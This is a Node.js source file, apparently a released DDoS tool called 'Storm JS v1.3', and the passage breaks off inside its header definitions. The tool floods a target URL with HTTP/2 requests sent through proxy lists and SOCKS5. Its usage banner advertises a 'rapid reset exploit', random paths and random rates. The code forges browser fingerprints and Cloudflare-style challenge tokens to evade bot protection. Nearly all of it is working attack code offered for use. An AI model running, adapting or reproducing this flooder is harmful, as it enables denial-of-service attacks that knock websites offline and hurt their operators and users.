
/*
    Storm (js v1.3)
    Released by Serena Lotus

    Made by Crisxtop
*/

const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const dns = require('dns');
const socks = require('socks').SocksClient;
const util = require('util');
const crypto = require("crypto");
const HPACK = require('hpack');
const fs = require("fs");
const fetch = require('node-fetch');
const os = require("os");
const Buffer = require('buffer').Buffer;
const v8 = require('v8');
const colors = require("colors");
const chalk = require('chalk');
const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");

function get_option(flag) {
    const index = process.argv.indexOf(flag);
    return index !== -1 && index + 1 < process.argv.length ? process.argv[index + 1] : undefined;
}

const options = [
    { flag: '--cookie', value: get_option('--cookie')}, // DEFAULT : FALSE
    { flag: '--reset', value: get_option('--reset') },// DEFAULT : FALSE
    { flag: '--randagent', value: get_option('--randagent') },// DEFAULT : FALSE
    { flag: '--post', value: get_option('--post') },// DEFAULT : FALSE
    { flag: '--ipv6', value: get_option('--ipv6') },// DEFAULT : FALSE
    { flag: '--randrate', value: get_option('--randrate') },// DEFAULT : FALSE
    { flag: '--delay', value: get_option('--delay') },// DEFAULT : FALSE
    { flag: '--double', value: get_option('--double') },// DEFAULT : FALSE
    { flag: '--status', value: get_option('--status') },// DEFAULT : FALSE
    { flag: '--randpath', value: get_option('--randpath') },// DEFAULT : FALSE
    { flag: '--socks5', value: get_option('--socks5') },// DEFAULT : FALSE
];

function enabled(buf) {
    var flag = `--${buf}`;
    const option = options.find(option => option.flag === flag);

    if (option === undefined) { return false; }

    const optionValue = option.value;

    if (optionValue === "true" || optionValue === true) {
        return true;
    } else if (optionValue === "false" || optionValue === false) {
        return false;
    }
    
    if (!isNaN(optionValue)) {
        return parseInt(optionValue);
    }

    if (typeof optionValue === 'string') {
        return optionValue;
    }

    return false;
}
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");

function encodeFrame(streamId, type, payload = "", flags = 0) {
    const frame = Buffer.alloc(9 + payload.length);
    frame.writeUInt24BE(payload.length, 0);
    frame.writeUInt8(type, 3);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId, 5);
    if (payload.length > 0) {
        frame.set(payload, 9);
    }

    return frame;
}
function encodeRstStream(streamId, type, flags) {
    const frameHeader = Buffer.alloc(9);
    frameHeader.writeUInt32BE(4, 0);
    frameHeader.writeUInt8(type, 4);
    frameHeader.writeUInt8(flags, 5);
    frameHeader.writeUInt32BE(streamId, 5);
    const statusCode = Buffer.alloc(4).fill(0);
    return Buffer.concat([frameHeader, statusCode]);
}
function decodeFrame(data) {
    const lengthAndType = data.readUInt32BE(0)
    const length = lengthAndType >> 8
    const type = lengthAndType & 0xFF
    const flags = data.readUint8(4)
    const streamId = data.readUInt32BE(5)
    const offset = flags & 0x20 ? 5 : 0

    let payload = Buffer.alloc(0)

    if (length > 0) {
        payload = data.subarray(9 + offset, 9 + offset + length)

        if (payload.length + offset != length) {
            return null
        }
    }

    return {
        streamId,
        length,
        type,
        flags,
        payload
    }
}

function getRandomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

 function randomElement(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}
    
 function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    return Array.from({ length }, () => characters.charAt(Math.floor(Math.random() * characters.length))).join('');
  }

const shuffleObject = (obj) => {
                const keys = Object.keys(obj);
                for (let i = keys.length - 1; i > 0; i--) {
                    const j = Math.floor(Math.random() * (i + 1));
                    [keys[i], keys[j]] = [keys[j], keys[i]];
                }
                const shuffledObj = {};
                keys.forEach(key => shuffledObj[key] = obj[key]);
                return shuffledObj;
            };
            







    function shuffleArray(array) {
    for (let i = array.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [array[i], array[j]] = [array[j], array[i]];
    }
    return array;
}

const cplist = [
    'TLS_AES_128_CCM_8_SHA256',
		'TLS_AES_128_CCM_SHA256',
		'TLS_CHACHA20_POLY1305_SHA256',
		'TLS_AES_256_GCM_SHA384',
		'TLS_AES_128_GCM_SHA256'
];

const shuffledCplist = shuffleArray([...cplist]);

const cipper = shuffledCplist[0];
 ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'], ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];
process.on('uncaughtException', function(e) {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('unhandledRejection', function(e) {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('warning', e => {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
 const sigalgs = [
     "ecdsa_secp256r1_sha256",
          "rsa_pss_rsae_sha256",
          "rsa_pkcs1_sha256",
          "ecdsa_secp384r1_sha384",
          "rsa_pss_rsae_sha384",
          "rsa_pkcs1_sha384",
          "rsa_pss_rsae_sha512",
          "rsa_pkcs1_sha512"
] 
  let SignalsList = sigalgs.join(':')
const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448";
const secureOptions = 
 crypto.constants.SSL_OP_NO_SSLv2 |
 crypto.constants.SSL_OP_NO_SSLv3 |
 crypto.constants.SSL_OP_NO_TLSv1 |
 crypto.constants.SSL_OP_NO_TLSv1_1 |
 crypto.constants.SSL_OP_NO_TLSv1_3 |
 crypto.constants.ALPN_ENABLED |
 crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
 crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
 crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
 crypto.constants.SSL_OP_COOKIE_EXCHANGE |
 crypto.constants.SSL_OP_PKCS1_CHECK_1 |
 crypto.constants.SSL_OP_PKCS1_CHECK_2 |
 crypto.constants.SSL_OP_SINGLE_DH_USE |
 crypto.constants.SSL_OP_SINGLE_ECDH_USE |
 crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;
 if (process.argv.length < 7) {
    console.clear();
    console.log('');
    console.log(`${chalk.green('           29 September, 2024 | Developers of method: @needmoreloli //@@')}\n`);
    console.log(`${chalk.cyan.underline('DESCRIPTION:')}

 ${chalk.cyan(`${chalk.blue.bold.italic('STORM JS v1.3')}`)} | ${chalk.red('LATEST STORM JS VERSION 1.3 CODED BY CRISXTOP, MORE OPTIONAL ADVANCE ABOUT COOKIE, SOCKS5 TUNNEL CONNECTION, IPV6 CONNECTION, ATTACK WITH MORE WAYS LIKE RANDOMPATH, RANDOM RATE, DELAY BETWEEN REQUESTS')}
 
 ${chalk.red.underline('Usage:')}
 How to use & example:

 ${chalk.red.bold('node storm.js [targetURL] [time] [rates] [threads] [proxyFile]')}
 node storm.js https://example.com 120 64 10 proxy.txt --cookie true --socks5 true --delay 5

 ${chalk.magenta.bold.italic('Options:')}

 ${chalk.yellow.bold('// RANDOM ATTACK FUNCTIONS :' )}
 --randagent    ${chalk.green('true')}${chalk.red('/false')}        ENABLE USE OF RANDOM USER-AGENT            [Status: ${chalk.green('ONLINE')}]
 --randpath     ${chalk.green('true')}${chalk.red('/false')}        ENABLE ATTACK ON RANDOM PATH               [Status: ${chalk.green('ONLINE')}]
 --randrate     ${chalk.green('true')}${chalk.red('/false')}        ENABLE ATTACK WITH RANDOM RATE             [Status: ${chalk.green('ONLINE')}]
 ${chalk.yellow.bold('// POST REQUEST :' )}
 --post         ${chalk.green('true')}${chalk.red('/false')}        ENABLE USE OF POST REQUEST                 [Status: ${chalk.green('ONLINE')}]
 ${chalk.yellow.bold('// CONNECTION TUNNEL :' )}
 --socks5       ${chalk.green('true')}${chalk.red('/false')}        ENABLE SOCKS5 PROXY CONNECTION             [Status: ${chalk.green('ONLINE')}]
 --ipv6         ${chalk.green('true')}${chalk.red('/false')}        ENABLE IPV6 PROXY CONNECTION               [Status: ${chalk.green('ONLINE')}]
 ${chalk.yellow.bold('// EXTRA FUNCTIONS :' )}
 --status       ${chalk.green('true')}${chalk.red('/false')}        ENABLE TURN ON STATUS CODE                 [Status: ${chalk.green('ONLINE')}]
 --reset        ${chalk.green('true')}${chalk.red('/false')}        ENABLE USE OF RAPID RESET EXPLOIT          [Status: ${chalk.green('ONLINE')}]
 --delay        ${chalk.red('1-20')}              SET DELAY BETWEEN REQUESTS                 [Status: ${chalk.green('ONLINE')}]
 --double       ${chalk.green('true')}${chalk.red('/false')}        ENABLE MULTIPLEXING HTTP2                  [Status: ${chalk.red('OFFLINE')}]
 --cookie       ${chalk.green('true')}${chalk.red('/false')}        ENABLE SET-COOKIE HEADERS FOR UAM          [Status: ${chalk.green('ONLINE')}]
`);
process.exit();
 }


 const secureProtocol = "TLS_method";
 const headers = {};
 
 const secureContextOptions = {
     ciphers: ciphers,
     sigalgs: SignalsList,
     honorCipherOrder: true,
     secureOptions: secureOptions,
     secureProtocol: secureProtocol
 };
 
 const secureContext = tls.createSecureContext(secureContextOptions);
 const args = {
     target: process.argv[2],
     time: ~~process.argv[3],
     Rate: ~~process.argv[4],
     threads: ~~process.argv[5],
     proxyFile: process.argv[6],
 }

 async function runFlooder() {
 nodeii = getRandomInt(120,128)
var proxies = readLines(args.proxyFile);
const proxyAddr = randomElement(proxies);
const parsedProxy = proxyAddr.split(":");
const parsedTarget = url.parse(args.target); 
 class NetSocket {
     constructor(){}
     async SOCKS5(options, callback) {

      const address = options.address.split(':');
      socks.createConnection({
        proxy: {
          host: options.host,
          port: options.port,
          type: 5
        },
        command: 'connect',
        destination: {
          host: address[0],
          port: +address[1]
        }
      }, (error, info) => {
        if (error) {
          return callback(undefined, error);
        } else {
          return callback(info.socket, undefined);
        }
      });
     }
 HTTP(options, callback) {
     const parsedAddr = options.address.split(":");
     const addrHost = parsedAddr[0];
     const base64Credentials = Buffer.from(`${parsedProxy[2]}:${parsedProxy[3]}`).toString('base64');
    const proxyAuthorizationHeader = `Basic ${base64Credentials}`;
     let payload = `CONNECT ${options.address}:443 HTTP/1.1\r\n` +
                  `Host: ${options.address}:443\r\n` +
                  `Connection: Close\r\n` +
                  `Proxy-Connection: Keep-Alive\r\n\r\n`;

    if (enabled("ipv6")) {
        payload = `CONNECT ${options.address}:443 HTTP/1.1\r\n` +
                  `Host: ${options.address}:443\r\n` +
                  `Proxy-Authorization: ${proxyAuthorizationHeader}\r\n` +
                  `Connection: Keep-Alive\r\n` +
                  `Proxy-Connection: Keep-Alive\r\n\r\n`;
    }
     
     const buffer = new Buffer.from(payload);
     const connection = net.connect({
        host: options.host,
        port: options.port,
    });

    connection.setTimeout(options.timeout * 10000);
    connection.setKeepAlive(true, 100000);
    connection.setNoDelay(true)
    connection.on("connect", () => {
       connection.write(buffer);
   });

    connection.on("data", chunk => {
       const response = chunk.toString("utf-8");
       const isAlive = response.includes("HTTP/1.1 200");
       if (isAlive === false) {
           connection.destroy();
           return callback(undefined, "error: invalid response from proxy server");
       }
       return callback(connection, undefined);
   });

   connection.on("timeout", () => {
       connection.destroy();
       return callback(undefined, "error: timeout exceeded");
   });

}
}

const lookupPromise = util.promisify(dns.lookup);
let val;
let isp;
let pro;

async function getIPAndISP(url) {
    try {
        const { address } = await lookupPromise(url);
        const apiUrl = `http://ip-api.com/json/${address}`;
        const response = await fetch(apiUrl);
        if (response.ok) {
            const data = await response.json();
            isp = data.isp;
            console.log('ISP FOUND ', url, ':', isp);
        } else {
            return;
        }
    } catch (error) {
        return;
    }
}

const targetURL = parsedTarget.host;

getIPAndISP(targetURL);
 const Socker = new NetSocket();
 function readLines(filePath) {
     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }
  
    const parsedPort = parsedTarget.protocol == "https:" ? "443" : "80";
function taoDoiTuongNgauNhien() {
    const doiTuong = {};
    function getRandomNumber(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
  }
  maxi = getRandomNumber(2,3)
    for (let i = 1; i <=maxi ; i++) {
      
      
  
   const key = 'cf-per-'+ generateRandomString(1,9)
  
      const value =  generateRandomString(1,10) + '-' +  generateRandomString(1,12) + '=' +generateRandomString(1,12)
  
      doiTuong[key] = value;
    }
  
    return doiTuong;
  }
  function number(minLength, maxLength) {
    const characters = '0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    const randomStringArray = Array.from({
      length
    }, () => {
      const randomIndex = Math.floor(Math.random() * characters.length);
      return characters[randomIndex];
    });
    return randomStringArray.join('');
  }
function randstrr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}
const browsers = ["chrome", "safari", "brave", "firefox", "mobile", "opera", "operagx","yandex", "vivaldi", "edge"];
const getRandomBrowser = () => {
    const randomIndex = Math.floor(Math.random() * browsers.length);
    return browsers[randomIndex];
};

const generateHeaders = (browser) => {
    cache = ["no-cache", "no-store", "no-transform", "only-if-cached", "max-age=0", "must-revalidate", "public", "private", "proxy-revalidate", "s-maxage=86400"];
    
    const versions = {
        chrome: { min: 125, max: 128 },
        safari: { min: 18, max: 18 },
        brave: { min: 116, max: 120 },
        firefox: { min: 130, max: 130 },
        mobile: { min: 125, max: 125 },
        opera: { min: 104, max: 104 },
        operagx: { min: 104, max: 104 },
         yandex: { min: 23, max: 23 },
        vivaldi: { min: 115, max: 116 },
        edge: { min: 116, max: 116 }
    };
    
    const platforms = {
        chrome: ["Windows NT 10.0; Win64; x64", "Windows NT 11.0; Win64; x64", "Linux; Ubuntu; Linux x86_64"],
        safari: ["Macintosh; Intel Mac OS X 14_0", "Macintosh; Intel Mac OS X 13_0"],
        brave: ["Linux; Ubuntu; Linux x86_64", "Windows NT 10.0; Win64; x64"],
        firefox: ["Linux; Fedora; Linux x86_64", "Windows NT 10.0; Win64; x64"],
        mobile: ["Linux; Android 14; Pixel 8 Pro", "Linux; Android 13; Samsung Galaxy S23"],
        opera: ["Linux; Arch Linux x86_64", "Windows NT 10.0; Win64; x64"],
        operagx: ["Linux; Arch Linux x86_64", "Windows NT 11.0; Win64; x64"],
        yandex: ["Windows NT 10.0; Win64; x64", "Linux; Ubuntu; Linux x86_64"],
        vivaldi: ["Windows NT 11.0; Win64; x64", "Linux; Arch Linux x86_64"],
        edge: ["Windows NT 11.0; Win64; x64", "Windows NT 10.0; Win64; x64"]
    };

    const getPlatform = (browser) => {
        if (!platforms.hasOwnProperty(browser)) {
            console.error(`No platforms found for browser: ${browser}`);
            return "Windows NT 10.0; Win64; x64";
        }

        const platformList = platforms[browser];
        if (platformList.length === 0) {
            console.error(`Platform list is empty for browser: ${browser}`);
            return "Windows NT 10.0; Win64; x64";
        }

        const randomIndex = Math.floor(Math.random() * platformList.length);
        return platformList[randomIndex];
    };

    const getVersion = (browser) => {
        const versionRange = versions[browser];
        if (!versionRange) {
            console.error(`No version range found for browser: ${browser}`);
            return '120';
        }
        return Math.floor(Math.random() * (versionRange.max - versionRange.min + 1)) + versionRange.min;
    };

const userAgents = {
        chrome: `Mozilla/5.0 (${getPlatform('chrome')}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${getVersion('chrome')}.0.0.0 Safari/537.36`,
        safari: `Mozilla/5.0 (${getPlatform('safari')}) AppleWebKit/537.36 (KHTML, like Gecko) Version/${getVersion('safari')}.0 Safari/537.36`,
        brave: `Mozilla/5.0 (${getPlatform('brave')}) AppleWebKit/537.36 (KHTML, like Gecko) Brave/${getVersion('brave')}.0.0.0 Safari/537.36`,
        firefox: `Mozilla/5.0 (${getPlatform('firefox')}) Gecko/20100101 Firefox/${getVersion('firefox')}.0`,
        mobile: `Mozilla/5.0 (${getPlatform('mobile')}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${getVersion('mobile')}.0 Mobile Safari/537.36`,
        opera: `Mozilla/5.0 (${getPlatform('opera')}) AppleWebKit/537.36 (KHTML, like Gecko) Opera/${getVersion('opera')}.0`,
        operagx: `Mozilla/5.0 (${getPlatform('operagx')}) AppleWebKit/537.36 (KHTML, like Gecko) Opera GX/${getVersion('operagx')}.0`,
        edge: `Mozilla/5.0 (${getPlatform('edge')}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${getVersion('edge')}.0.0.0 Safari/537.36 Edg/${getVersion('edge')}.0.0.0`,
        vivaldi: `Mozilla/5.0 (${getPlatform('vivaldi')}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${getVersion('vivaldi')}.0.0.0 Safari/537.36 Vivaldi/${getVersion('vivaldi')}.0.0.0`,
        yandex: `Mozilla/5.0 (${getPlatform('yandex')}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${getVersion('yandex')}.0.0.0 Safari/537.36 YaBrowser/${getVersion('yandex')}.0.0.0`,
    };






const getSecChUaHeader = (browser) => {
    const version = getVersion(browser);
    const fullVersion = `v="${version}.0"`;

    switch (browser) {
        case 'chrome':
        case 'brave':
        case 'opera':
        case 'operagx':
            return `"${browser.charAt(0).toUpperCase() + browser.slice(1)}";${fullVersion}, "Chromium";${fullVersion}, "Google Chrome";${fullVersion}`;
        case 'firefox':
            return `"Firefox";${fullVersion}, "Gecko";${fullVersion}, "Firefox";${fullVersion}`;
        case 'safari':
            return `"Safari";${fullVersion}, "AppleWebKit";${fullVersion}, "Version";${fullVersion}`;
        case 'mobile':
            return `"Google Chrome";${fullVersion}, "Chromium";${fullVersion}, "Mobile";${fullVersion}`;
            case 'yandex':
            return `"Yandex";${fullVersion}, "Chromium";${fullVersion}, "Yandex Browser";${fullVersion}`;
        case 'vivaldi':
            return `"Vivaldi";${fullVersion}, "Chromium";${fullVersion}, "Vivaldi";${fullVersion}`;
        case 'edge':
            return `"Microsoft Edge";${fullVersion}, "Chromium";${fullVersion}, "Edge";${fullVersion}`;
        default:
            return `"${browser.charAt(0).toUpperCase() + browser.slice(1)}";${fullVersion}, "Unknown Browser";${fullVersion}`;
    }
};

const getSecChUaFullVersion = (browser) => {
    const version = getVersion(browser);
    return `v="${version}.0"`;
};


const getSecChUaPlatform = (browser) => {
    return getPlatform(browser);
};


const randpathEnabled = enabled('randpath');
const timestamp = Date.now();
const timestampString = timestamp.toString().substring(0, 10);
const pathValue = randpathEnabled
  ? (Math.random() < 1 / 100000
      ? `${parsedTarget.path}?__cf_chl_rt_tk=${randstrr(30)}_${randstrr(12)}-${timestampString}-0-gaNy${randstrr(8)}`
      : `${parsedTarget.path}?search=${randstrr(30)}&&lr${randstrr(12)}`
    )
  : parsedTarget.path;
  
  
  const languages = () => {
    const baseLangQuality = Math.random() < 0.05 ? (0.7 + Math.random() * 0.2).toFixed(1) : '0.7';
    let baseLang = `en-US,en;q=${baseLangQuality}`;

    const extraLanguages = [
        "ru-RU,ru;q=0.8", "fr-FR,fr;q=0.7", "de-DE,de;q=0.9", "es-ES,es;q=0.6",
        "zh-CN,zh;q=0.5", "it-IT,it;q=0.7", "ja-JP,ja;q=0.6", "ko-KR,ko;q=0.6",
        "pt-PT,pt;q=0.8", "nl-NL,nl;q=0.7", "sv-SE,sv;q=0.3", "no-NO,no;q=0.5",
        "da-DK,da;q=0.9", "fi-FI,fi;q=0.2", "pl-PL,pl;q=0.3", "cs-CZ,cs;q=0.5",
        "hu-HU,hu;q=0.7", "tr-TR,tr;q=0.8", "el-GR,el;q=0.9", "he-IL,he;q=0.5",
        "ar-SA,ar;q=0.3", "hi-IN,hi;q=0.7", "th-TH,th;q=0.6",
        "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5"
    ];

    if (Math.random() < 0.03) {
        const selectedLangs = extraLanguages
            .sort(() => 0.5 - Math.random())
            .slice(0, 2 + Math.floor(Math.random() * 3));
        baseLang += `,${selectedLangs.join(',')}`;
    }

    return baseLang;
};


    
    
const secChUaMobile = browser === "mobile" ? "?1" : "?0";
    const acceptEncoding = Math.random() < 0.5 ? "gzip, deflate, br, zstd" : "gzip, deflate, br";
    const accept = Math.random() < 0.5 ? "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" : "application/json";

const additionalHeaders = enabled('post') ? { "content-length": "0" } : {};
const httpMethod = enabled('post') ? "POST" : "GET";
    const headersMap = {
    brave: {
            ":method": httpMethod,
            ":authority":parsedTarget.host,
            ":scheme": "https",
            ":path": pathValue,
            "sec-ch-ua": getSecChUaHeader("brave"),
            "sec-ch-ua-mobile": secChUaMobile,
            "accept": accept,
            "upgrade-insecure-requests": "1",
            "sec-fetch-site": Math.random() < 0.2 ? "none;none" : "none",
            "sec-fetch-mode": Math.random() < 0.2 ? "navigate;navigation" : "navigate",
            "sec-fetch-user": Math.random() < 0.2 ? "?1;?1" : "?1",
            "sec-fetch-dest": "document",
            "sec-ch-ua-platform":getSecChUaPlatform("brave"),
            "Pragma" : "no-cache",
            ...additionalHeaders,
            "cache-control": cache[Math.floor(Math.random() * cache.length)],
            "user-agent": userAgents["brave"],
            "accept-encoding": acceptEncoding,
            "accept-language": languages(),
            "sec-ch-ua-full-version": getSecChUaFullVersion("brave"),
            
       },
       yandex: {
        ":method": httpMethod,
        ":authority":parsedTarget.host,
        ":scheme": "https",
        ":path": pathValue,
        "sec-ch-ua": getSecChUaHeader("yandex"),
        "sec-ch-ua-mobile": secChUaMobile,
        "accept": accept,
        "upgrade-insecure-requests": "1",
        "sec-fetch-site": Math.random() < 0.2 ? "none;none" : "none",
        "sec-fetch-mode": Math.random() < 0.2 ? "navigate;navigation" : "navigate",
        "sec-fetch-user": Math.random() < 0.2 ? "?1;?1" : "?1",
        "sec-fetch-dest": "document",
        "sec-ch-ua-platform":getSecChUaPlatform("yandex"),
        "Pragma" : "no-cache",
        ...additionalHeaders,
        "cache-control": cache[Math.floor(Math.random() * cache.length)],
        "user-agent": userAgents["yandex"],
        "accept-encoding": acceptEncoding,
        "accept-language": languages(),
        "sec-ch-ua-full-version": getSecChUaFullVersion("yandex"),
        
   },
        vivaldi: {
        ":method": httpMethod,
        ":authority":parsedTarget.host,
        ":scheme": "https",
        ":path": pathValue,
        "sec-ch-ua": getSecChUaHeader("vivaldi"),
        "sec-ch-ua-mobile": secChUaMobile,
        "accept": accept,
        "upgrade-insecure-requests": "1",
        "sec-fetch-site": Math.random() < 0.2 ? "none;none" : "none",
        "sec-fetch-mode": Math.random() < 0.2 ? "navigate;navigation" : "navigate",
        "sec-fetch-user": Math.random() < 0.2 ? "?1;?1" : "?1",
        "sec-fetch-dest": "document",
        "sec-ch-ua-platform":getSecChUaPlatform("vivaldi"),
        "Pragma" : "no-cache",
        ...additionalHeaders,
        "cache-control": cache[Math.floor(Math.random() * cache.length)],
        "user-agent": userAgents["vivaldi"],
        "accept-encoding": acceptEncoding,
        "accept-language":languages(),
        "sec-ch-ua-full-version": getSecChUaFullVersion("vivaldi"),
        
   },
        edge: {
        ":method": httpMethod,
        ":authority":parsedTarget.host,
        ":scheme": "https",
        ":path": pathValue,
        "sec-ch-ua": getSecChUaHeader("edge"),
        "sec-ch-ua-mobile": secChUaMobile,
        "accept": accept,
        "upgrade-insecure-requests": "1",
        "sec-ch-ua-platform":getSecChUaPlatform("edge"),
        "sec-fetch-site": Math.random() < 0.2 ? "none;none" : "none",
        "sec-fetch-mode": Math.random() < 0.2 ? "navigate;navigation" : "navigate",
        "sec-fetch-user": Math.random() < 0.2 ? "?1;?1" : "?1",
        "sec-fetch-dest": "document",
        "Pragma" : "no-cache",
        ...additionalHeaders,
        "cache-control": cache[Math.floor(Math.random() * cache.length)],
        "user-agent": userAgents["edge"],
        "accept-encoding": acceptEncoding,
        "accept-language":languages(),
         "sec-ch-ua-full-version": getSecChUaFullVersion("edge"),
        
   },
        chrome: {
            ":method": httpMethod,
            ":authority":parsedTarget.host,
            ":scheme": "https",
            ":path": pathValue,
            "sec-ch-ua": getSecChUaHeader("chrome"),
            "sec-ch-ua-mobile": secChUaMobile,
            "accept": accept,
            "upgrade-insecure-requests": "1",
            "sec-fetch-site": Math.random() < 0.2 ? "none;none" : "none",
            "sec-fetch-mode": Math.random() < 0.2 ? "navigate;navigation" : "navigate",
            "sec-fetch-user": Math.random() < 0.2 ? "?1;?1" : "?1",
            "sec-fetch-dest": "document",
            "sec-ch-ua-platform":getSecChUaPlatform("chrome"),
            "Pragma" : "no-cache",
            ...additionalHeaders,
            "cache-control": cache[Math.floor(Math.random() * cache.length)],
            "user-agent": userAgents["chrome"],
            "accept-encoding": acceptEncoding,
            "accept-language":languages(),
             "sec-ch-ua-full-version": getSecChUaFullVersion("chrome"),
            
       },
        firefox:{
            ":method": httpMethod,
            ":authority":parsedTarget.host,
            ":scheme": "https",
            ":path": pathValue,
            "sec-ch-ua": getSecChUaHeader("firefox"),
            "sec-ch-ua-mobile": secChUaMobile,
            "accept": accept,
            "upgrade-insecure-requests": "1",
            "sec-fetch-site": Math.random() < 0.2 ? "none;none" : "none",
            "sec-fetch-mode": Math.random() < 0.2 ? "navigate;navigation" : "navigate",
            "sec-fetch-user": Math.random() < 0.2 ? "?1;?1" : "?1",
            "sec-fetch-dest": "document",
            "Pragma" : "no-cache",
            "sec-ch-ua-platform":getSecChUaPlatform("firefox"),
            ...additionalHeaders,
            "cache-control": cache[Math.floor(Math.random() * cache.length)],
            "user-agent": userAgents["firefox"],
            "accept-encoding": acceptEncoding,
            "accept-language": languages(),
            "sec-ch-ua-full-version": getSecChUaFullVersion("firefox"),
            
       },
        safari: {
            ":method": httpMethod,
            ":authority":parsedTarget.host,
            ":scheme": "https",
            ":path": pathValue,
            "sec-ch-ua": getSecChUaHeader("safari"),
            "sec-ch-ua-platform":getSecChUaPlatform("safari"),
            "sec-ch-ua-mobile": secChUaMobile,
            "accept": accept,
            "upgrade-insecure-requests": "1",
            "sec-fetch-site": Math.random() < 0.2 ? "none;none" : "none",
            "sec-fetch-mode": Math.random() < 0.2 ? "navigate;navigation" : "navigate",
            "sec-fetch-user": Math.random() < 0.2 ? "?1;?1" : "?1",
            "sec-fetch-dest": "document",
            "Pragma" : "no-cache",
            ...additionalHeaders,
            "cache-control": cache[Math.floor(Math.random() * cache.length)],
            "user-agent": userAgents["safari"],
            "accept-encoding": acceptEncoding,
            "accept-language": languages(),
            "sec-ch-ua-full-version": getSecChUaFullVersion("safari"),
            
        },
        mobile: {
            ":method": httpMethod,
            ":authority":parsedTarget.host,
            ":scheme": "https",
            ":path": pathValue,
            "sec-ch-ua": getSecChUaHeader("mobile"),
            "sec-ch-ua-mobile": secChUaMobile,
            "accept": accept,
            "upgrade-insecure-requests": "1",
            "sec-ch-ua-platform":getSecChUaPlatform("mobile"),
            "sec-fetch-site": Math.random() < 0.2 ? "none;none" : "none",
            "sec-fetch-mode": Math.random() < 0.2 ? "navigate;navigation" : "navigate",
            "sec-fetch-user": Math.random() < 0.2 ? "?1;?1" : "?1",
            "sec-fetch-dest": "document",
            "Pragma" : "no-cache",
            ...additionalHeaders,
            "cache-control": cache[Math.floor(Math.random() * cache.length)],
            "user-agent": userAgents["mobile"],
            "accept-encoding": acceptEncoding,
            "accept-language": languages(),
            "sec-ch-ua-full-version": getSecChUaFullVersion("mobile"),
            
        },
        opera: {
            ":method": httpMethod,
            ":authority":parsedTarget.host,
            ":scheme": "https",
            ":path": pathValue,
            "upgrade-insecure-requests": "1",
            "sec-ch-ua": getSecChUaHeader("opera"),
            "sec-ch-ua-platform":getSecChUaPlatform("opera"),
            "sec-ch-ua-mobile": secChUaMobile,
            "accept": accept,
            "sec-fetch-site": Math.random() < 0.2 ? "none;none" : "none",
            "sec-fetch-mode": Math.random() < 0.2 ? "navigate;navigation" : "navigate",
            "sec-fetch-user": Math.random() < 0.2 ? "?1;?1" : "?1",
            "sec-fetch-dest": "document",
            "Pragma" : "no-cache",
